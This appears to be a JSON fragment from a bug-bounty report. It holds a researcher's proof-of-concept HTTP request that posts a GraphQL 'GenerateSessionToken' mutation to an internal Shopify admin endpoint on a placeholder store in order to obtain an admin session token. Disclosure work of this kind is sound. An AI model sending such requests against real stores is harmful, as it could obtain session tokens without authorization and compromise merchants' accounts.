    {
      "id": 23540,
      "category": "researcher",
      "content": "POC request:\n```\nPOST /admin/internal/web/graphql/core HTTP/1.1\nHost: blabla.myshopify.com\nContent-Length: 225\n\n{\"operationName\":\"GenerateSessionToken\",\"variables\":{\"appId\":\"gid://shopify/App/\"},\"query\":\"mutation GenerateSessionToken($appId: ID!) {\\n  adminGenerateSession(appId: $appId) {\\n    session\\n    __typename\\n  }\\n}\\n\"}\n```",
